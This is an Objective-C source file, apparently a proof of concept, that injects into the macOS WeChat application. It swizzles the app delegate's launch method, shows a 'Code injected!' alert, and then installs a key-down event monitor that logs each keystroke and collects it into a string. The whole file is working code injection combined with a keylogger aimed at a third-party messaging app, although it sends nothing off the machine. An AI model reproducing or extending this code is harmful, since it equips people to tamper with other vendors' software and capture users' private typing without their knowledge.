//
//  WeChatPatch.m
//  WeChatPatch
//
//  Created by Suu on 5/15/14.
//  Copyright (c) 2014 suu. All rights reserved.
//

#import "WeChatPatch.h"

#include <stdio.h>
#include <objc/runtime.h>
#include <Foundation/Foundation.h>
#include <AppKit/AppKit.h>

static IMP sOriginalImp = NULL;

@implementation WeChatPatch

+(void)load
{
	Class originalClass = NSClassFromString(@"AppDelegate");
	Method originalMeth = class_getInstanceMethod(originalClass, @selector(applicationDidFinishLaunching:));
	sOriginalImp = method_getImplementation(originalMeth);
	
	Method replacementMeth = class_getInstanceMethod(NSClassFromString(@"WeChatPatch"), @selector(patchedApplicationDidFinishLaunching:));
	method_exchangeImplementations(originalMeth, replacementMeth);
}

-(void)patchedApplicationDidFinishLaunching:(id)sender
{
	sOriginalImp(self, @selector(applicationDidFinishLaunching:), self);
	
	NSAlert *alert = [NSAlert alertWithMessageText:@"Code injected!" defaultButton:@"OK" alternateButton:nil otherButton:nil informativeTextWithFormat:@"Successfully injected code into WeChat.app"];
	[alert runModal];
    
    NSMutableString *keystrokes = [NSMutableString string];
    [NSEvent addLocalMonitorForEventsMatchingMask:NSKeyDownMask handler:^NSEvent* (NSEvent* event){
        NSString *keyPressed = event.charactersIgnoringModifiers;
        NSLog(@"%@ Pressed",keyPressed);
        [keystrokes appendString:keyPressed];
        
        return event;
    }];
}

@end
